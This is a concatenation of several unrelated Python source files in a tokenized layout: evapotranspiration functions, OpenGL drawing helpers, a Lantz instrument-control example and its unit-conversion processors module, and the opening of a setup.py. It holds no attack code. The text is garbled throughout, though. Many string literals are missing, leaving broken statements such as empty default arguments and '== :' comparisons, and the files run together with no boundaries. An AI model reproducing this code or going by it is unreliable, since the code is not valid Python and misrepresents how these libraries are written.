g_T = ( ( TK - TL ) * ( TH - TK ) ** alpha_T ) / ( ( T0 - TL ) * ( TH - T0 ) ** alpha_T ) \n 
return g_T \n 
\n 
~~ def Gee_M ( SM , SM0 , K_M1 , K_M2 ) : \n 
~~~ g_SM = 1.0 - K_M1 * exp ( K_M2 * ( SM - SM0 ) ) \n 
return g_SM \n 
\n 
~~ def PenmanMonteithPET ( Tc , RH , Rn , S , SM , um , z0 , d , g0 , SM0 , P = 101.2 , zm = 2.0 ) : \n 
~~~ cP = 1.013 # Define specific heat of air in kJ/(kg*K) \n 
rho_a = AirDensity ( RH , Tc , P ) \n 
D = ( 1.0 - RH ) * SatVaporPress ( Tc ) \n 
delta = SlopeSatVaporPress ( Tc ) \n 
gamma = PsychConst ( P ) \n 
r_a = AeroReist ( um , zm , z0 , d ) \n 
r_s = SurfResist ( g0 , S , D , Tc , SM , SM0 ) \n 
\n 
LE = ( delta * Rn + ( rho_a * cP * D ) / r_a ) / ( delta + gamma * ( 1.0 + r_s / r_a ) ) \n 
\n 
return LE \n 
\n 
\n 
"""\nSupport for nicely indented GL sections in python using Python\'s with\nstatement.\n\nAuthor:\n    Todd Gamblin, tgamblin@llnl.gov\n""" \n 
~~ from contextlib import contextmanager \n 
from OpenGL . GL import * \n 
#from glefix import * \n 
\n 
@ contextmanager \n 
def glSection ( type ) : \n 
~~~ glBegin ( type ) \n 
yield \n 
glEnd ( ) \n 
\n 
~~ @ contextmanager \n 
def glMatrix ( ) : \n 
~~~ glPushMatrix ( ) \n 
yield \n 
glPopMatrix ( ) \n 
\n 
~~ @ contextmanager \n 
def glModeMatrix ( type ) : \n 
~~~ glMatrixMode ( type ) \n 
glPushMatrix ( ) \n 
yield \n 
glMatrixMode ( type ) \n 
glPopMatrix ( ) \n 
\n 
~~ @ contextmanager \n 
def attributes ( * glBits ) : \n 
~~~ for bit in glBits : \n 
~~~ glPushAttrib ( bit ) \n 
~~ yield \n 
for bit in glBits : \n 
~~~ glPopAttrib ( ) \n 
\n 
~~ ~~ @ contextmanager \n 
def enabled ( * glBits ) : \n 
~~~ for bit in glBits : \n 
~~~ glEnable ( bit ) \n 
~~ yield \n 
for bit in glBits : \n 
~~~ glDisable ( bit ) \n 
\n 
~~ ~~ @ contextmanager \n 
def disabled ( * glBits ) : \n 
~~~ for bit in glBits : \n 
~~~ glDisable ( bit ) \n 
~~ yield \n 
for bit in glBits : \n 
~~~ glEnable ( bit ) \n 
\n 
~~ ~~ @ contextmanager \n 
def overlays2D ( width , height , background_color ) : \n 
~~~ """The before and after gl calls necessary to setup 2D overlays to the\n       main gl drawing. This should be encase all methods which have a call to\n       setup_overlay2D.\n    """ \n 
# Prepare to change modes \n 
glDisable ( GL_LIGHTING ) \n 
glDisable ( GL_LIGHT0 ) \n 
glDisable ( GL_BLEND ) \n 
glEnable ( GL_SCISSOR_TEST ) \n 
with glModeMatrix ( GL_PROJECTION ) : \n 
~~~ yield \n 
# Change mode back \n 
~~ glViewport ( 0 , 0 , width , height ) \n 
glDisable ( GL_SCISSOR_TEST ) \n 
glMatrixMode ( GL_MODELVIEW ) \n 
glLoadIdentity ( ) \n 
glEnable ( GL_LIGHTING ) \n 
glEnable ( GL_LIGHT0 ) \n 
glEnable ( GL_BLEND ) \n 
glClearColor ( * background_color ) \n 
\n 
~~ def setup_overlay2D ( x , y , width , height ) : \n 
~~~ """Sets up the small 2D overlay area. The background is clear.\n    """ \n 
glMatrixMode ( GL_PROJECTION ) \n 
glLoadIdentity ( ) \n 
glScissor ( x , y , width , height ) \n 
glViewport ( x , y , width , height ) \n 
glOrtho ( x , x + width , y , y + height , - 1 , 1 ) \n 
glMatrixMode ( GL_MODELVIEW ) \n 
\n 
# Precalculated for polycylinder with 10 faces \n 
# sin 36, cos 36, cos 18, sin 18, two midpoints \n 
# away from axes \n 
~~ cyltrigs = [ 0.587785 , 0.809017 , 0.951057 , 0.309017 ] ; \n 
\n 
# Braindead replacement \n 
# Not that color is not used by us \n 
# and we only use middle two values of points \n 
def notGlePolyCylinder ( points , color , radius ) : \n 
\n 
~~~ trigs = [ radius * x for x in cyltrigs ] ; \n 
\n 
# Different per radius of cylinder \n 
if abs ( points [ 1 ] [ 0 ] - points [ 2 ] [ 0 ] ) > 1e-6 : \n 
~~~ with glSection ( GL_QUAD_STRIP ) : \n 
~~~ glNormal3f ( 0 , 0 , 1. ) \n 
glVertex ( points [ 1 ] [ 0 ] , 0 , radius ) \n 
glVertex ( points [ 2 ] [ 0 ] , 0 , radius ) \n 
glNormal3f ( 0 , cyltrigs [ 0 ] , cyltrigs [ 1 ] ) \n 
glVertex ( points [ 1 ] [ 0 ] , trigs [ 0 ] , trigs [ 1 ] ) \n 
glVertex ( points [ 2 ] [ 0 ] , trigs [ 0 ] , trigs [ 1 ] ) \n 
glNormal3f ( 0 , cyltrigs [ 2 ] , cyltrigs [ 3 ] ) \n 
glVertex ( points [ 1 ] [ 0 ] , trigs [ 2 ] , trigs [ 3 ] ) \n 
glVertex ( points [ 2 ] [ 0 ] , trigs [ 2 ] , trigs [ 3 ] ) \n 
glNormal3f ( 0 , cyltrigs [ 2 ] , - cyltrigs [ 3 ] ) \n 
glVertex ( points [ 1 ] [ 0 ] , trigs [ 2 ] , - trigs [ 3 ] ) \n 
glVertex ( points [ 2 ] [ 0 ] , trigs [ 2 ] , - trigs [ 3 ] ) \n 
glNormal3f ( 0 , cyltrigs [ 0 ] , - cyltrigs [ 1 ] ) \n 
glVertex ( points [ 1 ] [ 0 ] , trigs [ 0 ] , - trigs [ 1 ] ) \n 
glVertex ( points [ 2 ] [ 0 ] , trigs [ 0 ] , - trigs [ 1 ] ) \n 
glNormal3f ( 0 , 0 , - 1. ) \n 
glVertex ( points [ 1 ] [ 0 ] , 0 , - radius ) \n 
glVertex ( points [ 2 ] [ 0 ] , 0 , - radius ) \n 
glNormal3f ( 0 , - cyltrigs [ 0 ] , - cyltrigs [ 1 ] ) \n 
glVertex ( points [ 1 ] [ 0 ] , - trigs [ 0 ] , - trigs [ 1 ] ) \n 
glVertex ( points [ 2 ] [ 0 ] , - trigs [ 0 ] , - trigs [ 1 ] ) \n 
glNormal3f ( 0 , - cyltrigs [ 2 ] , - cyltrigs [ 3 ] ) \n 
glVertex ( points [ 1 ] [ 0 ] , - trigs [ 2 ] , - trigs [ 3 ] ) \n 
glVertex ( points [ 2 ] [ 0 ] , - trigs [ 2 ] , - trigs [ 3 ] ) \n 
glNormal3f ( 0 , - cyltrigs [ 2 ] , cyltrigs [ 3 ] ) \n 
glVertex ( points [ 1 ] [ 0 ] , - trigs [ 2 ] , trigs [ 3 ] ) \n 
glVertex ( points [ 2 ] [ 0 ] , - trigs [ 2 ] , trigs [ 3 ] ) \n 
glNormal3f ( 0 , - cyltrigs [ 0 ] , cyltrigs [ 1 ] ) \n 
glVertex ( points [ 1 ] [ 0 ] , - trigs [ 0 ] , trigs [ 1 ] ) \n 
glVertex ( points [ 2 ] [ 0 ] , - trigs [ 0 ] , trigs [ 1 ] ) \n 
glNormal3f ( 0 , 0 , 1. ) \n 
glVertex ( points [ 1 ] [ 0 ] , 0 , radius ) \n 
glVertex ( points [ 2 ] [ 0 ] , 0 , radius ) \n 
~~ ~~ elif abs ( points [ 1 ] [ 1 ] - points [ 2 ] [ 1 ] ) > 1e-6 : \n 
~~~ p1 = points [ 1 ] [ 1 ] \n 
p2 = points [ 2 ] [ 1 ] \n 
with glSection ( GL_QUAD_STRIP ) : \n 
~~~ glNormal3f ( 0 , 0 , 1. ) \n 
glVertex ( 0 , p1 , radius ) \n 
glVertex ( 0 , p2 , radius ) \n 
glNormal3f ( cyltrigs [ 0 ] , 0 , cyltrigs [ 1 ] ) \n 
glVertex ( trigs [ 0 ] , p1 , trigs [ 1 ] ) \n 
glVertex ( trigs [ 0 ] , p2 , trigs [ 1 ] ) \n 
glNormal3f ( cyltrigs [ 2 ] , 0 , cyltrigs [ 3 ] ) \n 
glVertex ( trigs [ 2 ] , p1 , trigs [ 3 ] ) \n 
glVertex ( trigs [ 2 ] , p2 , trigs [ 3 ] ) \n 
glNormal3f ( cyltrigs [ 2 ] , 0 , - cyltrigs [ 3 ] ) \n 
glVertex ( trigs [ 2 ] , p1 , - trigs [ 3 ] ) \n 
glVertex ( trigs [ 2 ] , p2 , - trigs [ 3 ] ) \n 
glNormal3f ( cyltrigs [ 0 ] , 0 , - cyltrigs [ 1 ] ) \n 
glVertex ( trigs [ 0 ] , p1 , - trigs [ 1 ] ) \n 
glVertex ( trigs [ 0 ] , p2 , - trigs [ 1 ] ) \n 
glNormal3f ( 0 , 0 , - 1. ) \n 
glVertex ( 0 , p1 , - radius ) \n 
glVertex ( 0 , p2 , - radius ) \n 
glNormal3f ( - cyltrigs [ 0 ] , 0 , - cyltrigs [ 1 ] ) \n 
glVertex ( - trigs [ 0 ] , p1 , - trigs [ 1 ] ) \n 
glVertex ( - trigs [ 0 ] , p2 , - trigs [ 1 ] ) \n 
glNormal3f ( - cyltrigs [ 2 ] , 0 , - cyltrigs [ 3 ] ) \n 
glVertex ( - trigs [ 2 ] , p1 , - trigs [ 3 ] ) \n 
glVertex ( - trigs [ 2 ] , p2 , - trigs [ 3 ] ) \n 
glNormal3f ( - cyltrigs [ 2 ] , 0 , cyltrigs [ 3 ] ) \n 
glVertex ( - trigs [ 2 ] , p1 , trigs [ 3 ] ) \n 
glVertex ( - trigs [ 2 ] , p2 , trigs [ 3 ] ) \n 
glNormal3f ( - cyltrigs [ 0 ] , 0 , cyltrigs [ 1 ] ) \n 
glVertex ( - trigs [ 0 ] , p1 , trigs [ 1 ] ) \n 
glVertex ( - trigs [ 0 ] , p2 , trigs [ 1 ] ) \n 
glNormal3f ( 0 , 0 , 1. ) \n 
glVertex ( 0 , p1 , radius ) \n 
glVertex ( 0 , p2 , radius ) \n 
~~ ~~ else : \n 
~~~ p1 = points [ 1 ] [ 2 ] \n 
p2 = points [ 2 ] [ 2 ] \n 
with glSection ( GL_QUAD_STRIP ) : \n 
~~~ glNormal3f ( 0 , 1. , 0 ) \n 
glVertex ( 0 , radius , p1 ) \n 
glVertex ( 0 , radius , p2 ) \n 
glNormal3f ( cyltrigs [ 0 ] , cyltrigs [ 1 ] , 0 ) \n 
glVertex ( trigs [ 0 ] , trigs [ 1 ] , p1 ) \n 
glVertex ( trigs [ 0 ] , trigs [ 1 ] , p2 ) \n 
glNormal3f ( cyltrigs [ 2 ] , cyltrigs [ 3 ] , 0 ) \n 
glVertex ( trigs [ 2 ] , trigs [ 3 ] , p1 ) \n 
glVertex ( trigs [ 2 ] , trigs [ 3 ] , p2 ) \n 
glNormal3f ( cyltrigs [ 2 ] , - cyltrigs [ 3 ] , 0 ) \n 
glVertex ( trigs [ 2 ] , - trigs [ 3 ] , p1 ) \n 
glVertex ( trigs [ 2 ] , - trigs [ 3 ] , p2 ) \n 
glNormal3f ( cyltrigs [ 0 ] , - cyltrigs [ 1 ] , 0 ) \n 
glVertex ( trigs [ 0 ] , - trigs [ 1 ] , p1 ) \n 
glVertex ( trigs [ 0 ] , - trigs [ 1 ] , p2 ) \n 
glNormal3f ( 0 , - 1. , 0 ) \n 
glVertex ( 0 , - radius , p1 ) \n 
glVertex ( 0 , - radius , p2 ) \n 
glNormal3f ( - cyltrigs [ 0 ] , - cyltrigs [ 1 ] , 0 ) \n 
glVertex ( - trigs [ 0 ] , - trigs [ 1 ] , p1 ) \n 
glVertex ( - trigs [ 0 ] , - trigs [ 1 ] , p2 ) \n 
glNormal3f ( - cyltrigs [ 2 ] , - cyltrigs [ 3 ] , 0 ) \n 
glVertex ( - trigs [ 2 ] , - trigs [ 3 ] , p1 ) \n 
glVertex ( - trigs [ 2 ] , - trigs [ 3 ] , p2 ) \n 
glNormal3f ( - cyltrigs [ 2 ] , cyltrigs [ 3 ] , 0 ) \n 
glVertex ( - trigs [ 2 ] , trigs [ 3 ] , p1 ) \n 
glVertex ( - trigs [ 2 ] , trigs [ 3 ] , p2 ) \n 
glNormal3f ( - cyltrigs [ 0 ] , cyltrigs [ 1 ] , 0 ) \n 
glVertex ( - trigs [ 0 ] , trigs [ 1 ] , p1 ) \n 
glVertex ( - trigs [ 0 ] , trigs [ 1 ] , p2 ) \n 
glNormal3f ( 0 , 1. , 0 ) \n 
glVertex ( 0 , radius , p1 ) \n 
glVertex ( 0 , radius , p2 ) \n 
\n 
\n 
# Braindead replacement  \n 
~~ ~~ ~~ def notGlutSolidCube ( size ) : \n 
~~~ p = size / 2 \n 
n = - 1 * p \n 
with glSection ( GL_QUADS ) : # front \n 
~~~ glNormal3f ( 0 , 0 , 1. ) \n 
glVertex ( n , p , n ) \n 
glVertex ( n , n , n ) \n 
glVertex ( p , n , n ) \n 
glVertex ( p , p , n ) \n 
~~ with glSection ( GL_QUADS ) : # top \n 
~~~ glNormal3f ( 0 , 1. , 0 ) \n 
glVertex ( n , p , p ) \n 
glVertex ( n , p , n ) \n 
glVertex ( p , p , n ) \n 
glVertex ( p , p , p ) \n 
~~ with glSection ( GL_QUADS ) : # right \n 
~~~ glNormal3f ( 1. , 0 , 0 ) \n 
glVertex ( p , p , n ) \n 
glVertex ( p , n , n ) \n 
glVertex ( p , n , p ) \n 
glVertex ( p , p , p ) \n 
~~ with glSection ( GL_QUADS ) : # back \n 
~~~ glNormal3f ( 0 , 0 , - 1. ) \n 
glVertex ( p , p , p ) \n 
glVertex ( p , n , p ) \n 
glVertex ( n , n , p ) \n 
glVertex ( n , p , p ) \n 
~~ with glSection ( GL_QUADS ) : # bottom \n 
~~~ glNormal3f ( 0 , - 1. , 0 ) \n 
glVertex ( p , n , p ) \n 
glVertex ( p , n , n ) \n 
glVertex ( n , n , n ) \n 
glVertex ( n , n , p ) \n 
~~ with glSection ( GL_QUADS ) : # left \n 
~~~ glNormal3f ( - 1. , 0 , 0 ) \n 
glVertex ( n , p , p ) \n 
glVertex ( n , n , p ) \n 
glVertex ( n , n , n ) \n 
glVertex ( n , p , n ) \n 
\n 
\n 
~~ ~~ class DisplayList ( object ) : \n 
~~~ """Use this to turn some rendering function of yours into a DisplayList,\n       without all the tedious setup.\n\n       Suppose you have a rendering function that looks like this:\n           def myRenderFunction():\n               # ... Do rendering stuff ...\n\n       And you want to use it to build a displayList:\n           myList = DisplayList(myRenderFunction)\n\n       Now to call the list, just do this:\n           myList()\n\n       If you want the render function to get called again the next time your\n       display list is called, you call "update()" on the display list:\n           myList.update()\n\n       Now the next call to myList() will generate you a new display list by\n       running your render function again.  After that, it just calls the\n       new list.\n\n       Note that your render function *can* take args, and you can pass them\n       when you call the display list, but they\'re only really passed along\n       when an update is needed, so it\'s probably best to just not make\n       render functions with arguments.\n\n       TODO: this should probably have ways to keep around active list ids so\n       TODO: that they can be freed up at the end of execution.\n    """ \n 
def __init__ ( self , renderFunction ) : \n 
~~~ self . renderFunction = renderFunction \n 
self . needsUpdate = True \n 
self . listId = None \n 
\n 
~~ def update ( self ) : \n 
~~~ self . needsUpdate = True \n 
\n 
~~ def __call__ ( self , * args ) : \n 
~~~ if self . needsUpdate : \n 
~~~ if self . listId : \n 
~~~ glDeleteLists ( self . listId , 1 ) \n 
~~ self . listId = glGenLists ( 1 ) \n 
\n 
glNewList ( self . listId , GL_COMPILE_AND_EXECUTE ) \n 
self . renderFunction ( * args ) \n 
glEndList ( ) \n 
self . needsUpdate = False \n 
~~ else : \n 
~~~ glCallList ( self . listId ) \n 
# -*- coding: utf-8 -*- \n 
~~ ~~ ~~ """\n    lantz.action\n    ~~~~~~~~~~~~\n\n    This example shows how to use a Backend with an embedded Backend.\n    (and apps WITHOUT graphical user interface).\n\n    :copyright: 2015 by Lantz Authors, see AUTHORS for more details.\n    :license: BSD, see LICENSE for more details.\n""" \n 
\n 
\n 
from lantz import Q_ \n 
\n 
# From your project you import: \n 
\n 
# the drivers you need (In this case just simulated dummy drivers). \n 
from lantz . drivers . examples . dummydrivers import DummyOsci , DummyFunGen , DummyShutter \n 
\n 
# and the application backend. \n 
# This particular backend has a function to scan the amplitude \n 
# of a function generator while measuring the oscilloscope trace and a shutter. \n 
# Under the hood it uses AmplitudeScanner but opens the shutter before scanning \n 
# and close it afterwards \n 
from myapps import AmplitudeScannerShutter \n 
\n 
# Drivers are instantiated in the usual way. \n 
fungen = DummyFunGen ( ) \n 
osci = DummyOsci ( ) \n 
shutter = DummyShutter ( ) \n 
\n 
# The backend is instantiated with keyword arguments to assign \n 
# instantiated drivers to each InstrumentSlot (see scanner.py) \n 
# The context manager (with statement) is used to initialize \n 
# and finalize the instruments. \n 
with AmplitudeScannerShutter ( fungen = fungen , osci = osci , shutter = shutter ) as app : \n 
\n 
~~~ print ( ) \n 
# We call any of the functions defined by the App. \n 
data = list ( app . scan_amplitude ( Q_ ( range ( 1 , 10 ) , ) ) ) \n 
\n 
\n 
~~ print ( data ) \n 
\n 
# -*- coding: utf-8 -*- \n 
"""\n    lantz.drivers.legacy.cobolt\n    ~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n    :company: Cobolt.\n    :description: DPSS lasers, diode laser modules, fiber pigtailed lasers.\n    :website: http://www.cobolt.se/\n\n    ----\n\n    :copyright: 2015 by Lantz Authors, see AUTHORS for more details.\n    :license: BSD, see LICENSE for more details.\n""" \n 
\n 
from . cobolt0601 import Cobolt0601 \n 
\n 
__all__ = [ ] \n 
# -*- coding: utf-8 -*- \n 
"""\n    lantz.processors\n    ~~~~~~~~~~~~~~~~\n\n    :copyright: 2015 by Lantz Authors, see AUTHORS for more details.\n    :license: BSD, see LICENSE for more details.\n""" \n 
\n 
import warnings \n 
\n 
from . import Q_ \n 
from . log import LOGGER as _LOG \n 
from stringparser import Parser \n 
\n 
\n 
class DimensionalityWarning ( Warning ) : \n 
~~~ pass \n 
\n 
\n 
~~ def _do_nothing ( value ) : \n 
~~~ return value \n 
\n 
\n 
~~ def _getitem ( a , b ) : \n 
~~~ """Return a[b] or if not found a[type(b)]\n    """ \n 
try : \n 
~~~ return a [ b ] \n 
~~ except KeyError : \n 
~~~ return a [ type ( b ) ] \n 
\n 
~~ ~~ getitem = _getitem \n 
\n 
def convert_to ( units , on_dimensionless = , on_incompatible = , \n 
return_float = False ) : \n 
~~~ """Return a function that convert a Quantity to to another units.\n\n    :param units: string or Quantity specifying the target units\n    :param on_dimensionless: how to proceed when a dimensionless number\n                             number is given.\n                             \'raise\' to raise an exception,\n                             \'warn\' to log a warning and proceed,\n                             \'ignore\' to silently proceed\n    :param on_incompatible: how to proceed when source and target units are\n                            incompatible. Same options as `on_dimensionless`\n\n    :raises: :class:`ValueError` if the incoming value cannot be\n             properly converted\n\n        >>> convert_to(\'mV\')(Q_(1, \'V\'))\n        <Quantity(1000.0, \'millivolt\')>\n        >>> convert_to(\'mV\', return_float=True)(Q_(1, \'V\'))\n        1000.0\n    """ \n 
if on_dimensionless not in ( , , ) : \n 
~~~ raise ValueError ( "{} is not a valid value for \'on_dimensionless\'. " \n 
"It should be either \'ignore\', \'warn\' or \'raise\'" . format ( on_dimensionless ) ) ~~ if on_incompatible not in ( , , ) : \n 
~~~ raise ValueError ( "{} is not a valid value for \'on_incompatible\'. " \n 
"It should be either \'ignore\', \'warn\' or \'raise\'" . format ( on_dimensionless ) ) \n 
~~ if isinstance ( units , str ) : \n 
~~~ units = Q_ ( 1 , units ) \n 
~~ elif not isinstance ( units , Q_ ) : \n 
~~~ raise ValueError ( "{} is not a valid value for \'units\'. " \n 
"It should be either str or Quantity" ) \n 
\n 
~~ if return_float : \n 
~~~ def _inner ( value ) : \n 
~~~ if isinstance ( value , Q_ ) : \n 
~~~ try : \n 
~~~ return value . to ( units ) . magnitude \n 
~~ except ValueError as e : \n 
~~~ if on_incompatible == : \n 
~~~ raise ValueError ( e ) \n 
~~ elif on_incompatible == : \n 
~~~ msg = . format ( value , units warnings . warn ( msg , DimensionalityWarning ) \n 
_LOG . warn ( msg ) \n 
\n 
\n 
~~ ~~ return value . magnitude \n 
~~ else : \n 
~~~ if not units . dimensionless : \n 
~~~ if on_dimensionless == : \n 
~~~ raise ValueError ( . format ( value , units ) ) \n 
~~ elif on_dimensionless == : \n 
~~~ msg = . format ( value , units ) \n 
warnings . warn ( msg , DimensionalityWarning ) \n 
_LOG . warn ( msg ) \n 
\n 
\n 
~~ ~~ return float ( value ) \n 
~~ ~~ return _inner \n 
~~ else : \n 
~~~ def _inner ( value ) : \n 
~~~ if isinstance ( value , Q_ ) : \n 
~~~ try : \n 
~~~ return value . to ( units ) \n 
~~ except ValueError as e : \n 
~~~ if on_incompatible == : \n 
~~~ raise ValueError ( e ) \n 
~~ elif on_incompatible == : \n 
~~~ msg = . format ( value , units ) \n 
warnings . warn ( msg , DimensionalityWarning ) \n 
_LOG . warn ( msg ) \n 
\n 
\n 
~~ ~~ return float ( value . magnitude ) * units \n 
~~ else : \n 
~~~ if not units . dimensionless : \n 
~~~ if on_dimensionless == : \n 
~~~ raise ValueError ( . format ( value , units ) ) \n 
~~ elif on_dimensionless == : \n 
~~~ msg = . format ( value , units ) \n 
warnings . warn ( msg , DimensionalityWarning ) \n 
_LOG . warn ( msg ) \n 
\n 
\n 
~~ ~~ return float ( value ) * units \n 
~~ ~~ return _inner \n 
\n 
\n 
~~ ~~ class Processor ( object ) : \n 
~~~ """Processor to convert the function parameters.\n\n    A `callable` argument will be used to convert the corresponding\n    function argument.\n\n    For example, here `x` will be converted to float, before entering\n    the function body::\n\n        >>> conv = Processor(float)\n        >>> conv\n        <class \'float\'>\n        >>> conv(\'10\')\n        10.0\n\n    The processor supports multiple argument conversion in a tuple::\n\n        >>> conv = Processor((float, str))\n        >>> type(conv)\n        <class \'lantz.processors.Processor\'>\n        >>> conv((\'10\', 10))\n        (10.0, \'10\')\n\n    """ \n 
\n 
def __new__ ( cls , processors ) : \n 
\n 
~~~ if isinstance ( processors , ( tuple , list ) ) : \n 
~~~ if len ( processors ) > 1 : \n 
~~~ inst = super ( ) . __new__ ( cls ) \n 
inst . processors = tuple ( cls . _to_callable ( processor ) \n 
for processor in processors ) \n 
return inst \n 
~~ else : \n 
~~~ return cls . _to_callable ( processors [ 0 ] ) \n 
~~ ~~ else : \n 
~~~ return cls . _to_callable ( processors ) \n 
\n 
~~ ~~ def __call__ ( self , values ) : \n 
~~~ return tuple ( processor ( value ) \n 
for processor , value in zip ( self . processors , values ) ) \n 
\n 
~~ @ classmethod \n 
def _to_callable ( cls , obj ) : \n 
~~~ if callable ( obj ) : \n 
~~~ return obj \n 
~~ if obj is None : \n 
~~~ return _do_nothing \n 
~~ return cls . to_callable ( obj ) \n 
\n 
~~ @ classmethod \n 
def to_callable ( cls , obj ) : \n 
~~~ raise TypeError ( . format ( obj ) ) \n 
\n 
~~ def __len__ ( self ) : \n 
~~~ if isinstance ( self . processors , tuple ) : \n 
~~~ return len ( self . processors ) \n 
~~ return 1 \n 
\n 
\n 
~~ ~~ class FromQuantityProcessor ( Processor ) : \n 
~~~ """Processor to convert the units the function arguments.\n\n    The syntax is equal to `Processor` except that strings are interpreted\n    as units.\n\n        >>> conv = FromQuantityProcessor(\'ms\')\n        >>> conv(Q_(1, \'s\'))\n        1000.0\n\n    """ \n 
\n 
@ classmethod \n 
def to_callable ( cls , obj ) : \n 
~~~ if isinstance ( obj , ( str , Q_ ) ) : \n 
~~~ return convert_to ( obj , return_float = True ) \n 
~~ raise TypeError ( \n 
. format ( obj ) ) \n 
\n 
\n 
~~ ~~ class ToQuantityProcessor ( Processor ) : \n 
~~~ """Decorator to convert the units the function arguments.\n\n    The syntax is equal to `Processor` except that strings are interpreted\n    as units.\n\n        >>> conv = ToQuantityProcessor(\'ms\')\n        >>> conv(Q_(1, \'s\'))\n        <Quantity(1000.0, \'millisecond\')>\n        >>> conv(1)\n        <Quantity(1.0, \'millisecond\')>\n\n    """ \n 
\n 
@ classmethod \n 
def to_callable ( cls , obj ) : \n 
~~~ if isinstance ( obj , ( str , Q_ ) ) : \n 
~~~ return convert_to ( obj , on_dimensionless = ) \n 
~~ raise TypeError ( \n 
. format ( obj ) ) \n 
\n 
\n 
~~ ~~ class ParseProcessor ( Processor ) : \n 
~~~ """Processor to convert/parse the function parameters.\n\n    The syntax is equal to `Processor` except that strings are interpreted\n    as a :class:Parser expression.\n\n        >>> conv = ParseProcessor(\'spam {:s} eggs\')\n        >>> conv(\'spam ham eggs\')\n        \'ham\'\n\n        >>> conv = ParseProcessor((\'hi {:d}\', \'bye {:s}\'))\n        >>> conv((\'hi 42\', \'bye Brian\'))\n        (42, \'Brian\')\n\n    """ \n 
\n 
@ classmethod \n 
def to_callable ( cls , obj ) : \n 
~~~ if isinstance ( obj , str ) : \n 
~~~ return Parser ( obj ) \n 
~~ raise TypeError ( \n 
. format ( obj ) ) \n 
\n 
\n 
~~ ~~ class MapProcessor ( Processor ) : \n 
~~~ """Processor to map the function parameter values.\n\n    The syntax is equal to `Processor` except that a dict is used as\n    mapping table.\n\n    Examples::\n\n        >>> conv = MapProcessor({True: 42})\n        >>> conv(True)\n        42\n\n    """ \n 
\n 
@ classmethod \n 
def to_callable ( cls , obj ) : \n 
~~~ if isinstance ( obj , dict ) : \n 
~~~ return get_mapping ( obj ) \n 
~~ if isinstance ( obj , set ) : \n 
~~~ return check_membership ( obj ) \n 
~~ raise TypeError ( \n 
. format ( obj ) ) \n 
\n 
\n 
~~ ~~ class ReverseMapProcessor ( Processor ) : \n 
~~~ """Processor to map the function parameter values.\n\n    The syntax is equal to `Processor` except that a dict is used as\n    mapping table.\n\n    Examples::\n\n        >>> conv = ReverseMapProcessor({True: 42})\n        >>> conv(42)\n        True\n    """ \n 
\n 
#: Shared cache of reversed dictionaries indexed by the id() \n 
__reversed_cache = { } \n 
\n 
@ classmethod \n 
def to_callable ( cls , obj ) : \n 
~~~ if isinstance ( obj , dict ) : \n 
~~~ obj = cls . __reversed_cache . setdefault ( id ( obj ) , \n 
{ value : key for key , value \n 
in obj . items ( ) } ) \n 
return get_mapping ( obj ) \n 
~~ if isinstance ( obj , set ) : \n 
~~~ return check_membership ( obj ) \n 
~~ raise TypeError ( \n 
. format ( obj ) ) \n 
\n 
\n 
~~ ~~ class RangeProcessor ( Processor ) : \n 
~~~ """Processor to convert the units the function arguments.\n\n    The syntax is equal to `Processor` except that iterables are interpreted\n    as (low, high, step) specified ranges. Step is optional and max is included\n\n        >>> conv = RangeProcessor(((1, 2, .5), ))\n        >>> conv(1.7)\n        1.5\n\n    """ \n 
\n 
@ classmethod \n 
def to_callable ( cls , obj ) : \n 
~~~ if not isinstance ( obj , ( list , tuple ) ) : \n 
~~~ raise TypeError ( \n 
. format ( obj ) ) \n 
~~ if not len ( obj ) in ( 1 , 2 , 3 ) : \n 
~~~ raise TypeError ( \n 
\n 
. format ( len ( obj ) ) ) \n 
\n 
~~ if len ( obj ) == 1 : \n 
~~~ return check_range_and_coerce_step ( 0 , * obj ) \n 
~~ return check_range_and_coerce_step ( * obj ) \n 
\n 
\n 
\n 
~~ ~~ def check_range_and_coerce_step ( low , high , step = None ) : \n 
~~~ """\n\n    :param low:\n    :param high:\n    :param step:\n    :return:\n\n        >>> checker = check_range_and_coerce_step(1, 10)\n        >>> checker(1), checker(5), checker(10)\n        (1, 5, 10)\n        >>> checker(11)\n        Traceback (most recent call last):\n        ...\n        ValueError: 11 not in range (1, 10)\n        >>> checker = check_range_and_coerce_step(1, 10, 1)\n        >>> checker(1), checker(5.4), checker(10)\n        (1, 5, 10)\n\n    """ \n 
def _inner ( value ) : \n 
~~~ if not ( low <= value <= high ) : \n 
~~~ raise ValueError ( . format ( value , low , high ) ) \n 
~~ if step : \n 
~~~ value = round ( ( value - low ) / step ) * step + low \n 
~~ return value \n 
\n 
~~ return _inner \n 
\n 
\n 
~~ def check_membership ( container ) : \n 
~~~ """\n\n    :param container:\n    :return:\n\n        >>> checker = check_membership((1, 2, 3))\n        >>> checker(1)\n        1\n        >>> checker(0)\n        Traceback (most recent call last):\n        ...\n        ValueError: 0 not in (1, 2, 3)\n\n    """ \n 
\n 
def _inner ( value ) : \n 
~~~ if value not in container : \n 
~~~ raise ValueError ( . format ( value , container ) ) \n 
~~ return value \n 
~~ return _inner \n 
\n 
\n 
~~ def get_mapping ( container ) : \n 
~~~ """\n        >>> getter = get_mapping({\'A\': 42, \'B\': 43})\n        >>> getter(\'A\')\n        42\n        >>> getter(0)\n        Traceback (most recent call last):\n        ...\n        ValueError: 0 not in (\'A\', \'B\')\n\n    """ \n 
\n 
def _inner ( key ) : \n 
~~~ if key not in container : \n 
~~~ raise ValueError ( "{!r} not in {}" . format ( key , tuple ( container . keys ( ) ) ) ) \n 
~~ return container [ key ] \n 
~~ return _inner \n 
#!/usr/bin/env python \n 
# -*- coding: utf-8 -*- \n 
\n 
~~ try : \n 
~~~ from setuptools import setup \n 
~~ except ImportError : \n 
~~~ print ( ) \n 
sys . exit ( 1 ) \n 
\n 
\n 
~~ import os \n 
import sys \n 
import codecs \n 
\n 
\n 
def read ( filename ) : \n 
~~~ return codecs . open ( filename , encoding = ) . read ( ) \n 
\n 
\n 
~~ long_description = . join ( [ read ( ) , \n 
read ( ) , \n 
read ( ) ] ) \n 
\n 
__doc__ = long_description \n 
\n 
requirements = [ ] \n 
\n 
if sys . version_info < ( 3 , 4 ) : \n 
~~~ requirements . append ( ) \n 
\n 
~~ root_folder = os . path . dirname ( os . path . abspath ( __file__ ) ) \n 
\n 
# Compile a list of companies with drivers. \n 
folder = os . path . join ( root_folder , , ) \n 
paths = os . listdir ( folder ) \n 
companies = [ path for path in paths \n 
if os . path . isdir ( os . path . join ( folder , path ) ) \n 
and os . path . exists ( os . path . join ( folder , path , ) ) ] \n 
\n 
\n 
# Compile a list of companies with legacy drivers. \n 
